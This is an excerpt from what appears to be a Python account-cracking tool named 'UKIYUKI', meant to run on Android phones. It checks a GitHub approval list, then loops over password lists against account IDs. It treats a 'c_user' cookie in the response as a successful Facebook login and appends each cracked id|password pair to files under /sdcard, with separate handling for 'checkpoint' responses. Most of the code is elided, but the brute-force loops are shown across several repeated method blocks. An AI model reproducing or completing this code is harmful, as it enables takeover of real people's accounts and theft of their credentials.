...
def YUKIALWAYSONFIRE():
  ...
  try:
    httpCaht = requests.get(f"https://github.com/YukihiraSen/Yuki/blob/main/approval.txt").text
    if id in httpCaht:
...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 ...
 Tool Name : \033[1;36mUKIYUKI\033[1;37m
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in YUKI:
                                ...
                                open(f'/sdcard/YUKI•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in YUKI:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/YUKI•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in YUKI:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in YUKI:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/YUKI•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in YUKI:
                                if 'y' in pcp:
